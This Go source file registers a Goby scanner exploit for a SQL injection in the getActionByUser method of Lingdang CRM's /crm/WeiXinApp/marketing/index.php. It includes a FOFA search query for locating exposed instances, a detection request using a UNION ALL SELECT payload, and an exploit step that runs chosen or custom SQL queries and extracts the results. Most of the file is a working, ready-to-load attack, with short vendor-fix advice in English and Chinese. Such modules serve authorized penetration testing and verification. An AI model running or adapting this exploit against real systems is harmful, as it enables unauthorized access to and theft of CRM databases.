package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Lingdang CRM /crm/WeiXinApp/marketing/index.php getActionByUser SQL Injection Vulnerability",
    "Description": "<p>Lingdang CRM Standard Edition is one of the most popular CRM software in China, suitable for small and medium-sized enterprises focusing on sales and service businesses. This vulnerability exists in the getActionByUser method of the /crm/WeiXinApp/marketing/index.php interface in Lingdang CRM, allowing attackers to construct malicious SQL statements to exploit the vulnerability and obtain sensitive information from the server, potentially leading to data leakage and system control.</p>",
    "Product": "Lingdang CRM",
    "Homepage": "https://www.51mis.com/",
    "DisclosureDate": "2025-02-02",
    "PostTime": "2025-02-06",
    "Author": "heqiming@baimaohui.net",
    "FofaQuery": "body=\"http://localhost:8088/crm/index.php\" && body=\"ldcrm.base.js\"",
    "GobyQuery": "body=\"http://localhost:8088/crm/index.php\" && body=\"ldcrm.base.js\"",
    "Level": "2",
    "Impact": "<p>This vulnerability allows attackers to obtain sensitive server information through SQL injection, potentially leading to data leakage, privilege escalation, and complete system control.</p>",
    "Recommendation": "<p>It is recommended to contact the vendor to fix the vulnerability (<a href=\"https://www.51mis.com/\">https://www.51mis.com/</a>). In the meantime, set access policies through firewalls and other security devices, enable whitelist access, and prohibit public access to the system to reduce risks.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "select database(),select version(),select user()",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "select database()",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/crm/WeiXinApp/marketing/index.php",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
                    "Cookie": "PHPSESSID=0uvu3mmanpvqp20d2phr04n74d"
                },
                "data_type": "text",
                "data": "action=getActionByUser&module=Users&userid=1&logincrm_userid=2&operate=3&wx_user_id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7e7e7e,MD5({{{rand_int}}}),0x7e7e7e),NULL,NULL-- -"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "{{{rand_int_md5}}}",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/crm/WeiXinApp/marketing/index.php",
                "follow_redirect": false,
                "header": {
                    "Accept-Language": "zh-CN,zh;q=0.9",
                    "Cookie": "PHPSESSID=0uvu3mmanpvqp20d2phr04n74d",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
                    "accept": "*/*",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "action=getActionByUser&module=Users&userid=1&logincrm_userid=2&operate=3&wx_user_id=1+UNION+ALL+SELECT+NULL,NULL,CONCAT(0x7e7e7e,({{{payload}}}),0x7e7e7e),NULL,NULL--+-"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|~~~([^'][\\s\\S]*?)~~~",
                "output|when|attackType=sqlpoint|{{{lastreq}}}action=getActionByUser&module=Users&userid=1&logincrm_userid=2&operate=3&wx_user_id=1*"
            ]
        }
    ],
    "Tags": [
        "SQL Injection",
        "AI"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.5",
    "Translation": {
        "CN": {
            "Name": "灵当CRM /crm/WeiXinApp/marketing/index.php getActionByUser SQL 注入漏洞",
            "Product": "灵当CRM",
            "Description": "<p>灵当CRM标准版是国内最受欢迎的CRM软件，适用于以销售和服务业务为主的中小型企业。该漏洞存在于灵当CRM /crm/WeiXinApp/marketing/index.php接口中的getActionByUser方法，攻击者可以通过构造恶意的SQL语句，利用该漏洞获取服务器的敏感信息，可能导致数据泄露和系统被控制。</p>",
            "Recommendation": "<p>建议用户联系厂商修复漏洞（<a href=\"https://www.51mis.com/\">https://www.51mis.com/</a>）。在此之前，通过防火墙等安全设备设置访问策略，启用白名单访问，并禁止公网访问该系统以降低风险。</p>",
            "Impact": "<p>该漏洞允许攻击者通过SQL注入获取服务器敏感信息，可能导致数据泄露、权限提升以及系统被完全控制等严重后果。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "AI"
            ]
        },
        "EN": {
            "Name": "Lingdang CRM /crm/WeiXinApp/marketing/index.php getActionByUser SQL Injection Vulnerability",
            "Product": "Lingdang CRM",
            "Description": "<p>Lingdang CRM Standard Edition is one of the most popular CRM software in China, suitable for small and medium-sized enterprises focusing on sales and service businesses. This vulnerability exists in the getActionByUser method of the /crm/WeiXinApp/marketing/index.php interface in Lingdang CRM, allowing attackers to construct malicious SQL statements to exploit the vulnerability and obtain sensitive information from the server, potentially leading to data leakage and system control.</p>",
            "Recommendation": "<p>It is recommended to contact the vendor to fix the vulnerability (<a href=\"https://www.51mis.com/\">https://www.51mis.com/</a>). In the meantime, set access policies through firewalls and other security devices, enable whitelist access, and prohibit public access to the system to reduce risks.</p>",
            "Impact": "<p>This vulnerability allows attackers to obtain sensitive server information through SQL injection, potentially leading to data leakage, privilege escalation, and complete system control.</p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "AI"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "payload": "switch|attackType|{{{default}}}",
        "rand_int": "define|variable|{{{rand|int|8}}}",
        "rand_int_md5": "define|md5|{{{rand_int}}}",
        "vulurl": "define|variable|{{{fixedhostinfo}}}/crm/WeiXinApp/marketing/index.php"
    },
    "VariablesOrder": [
        "payload",
        "rand_int",
        "rand_int_md5",
        "vulurl"
    ],
    "EditType": "fast",
    "PocId": "9984"
}`
  
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}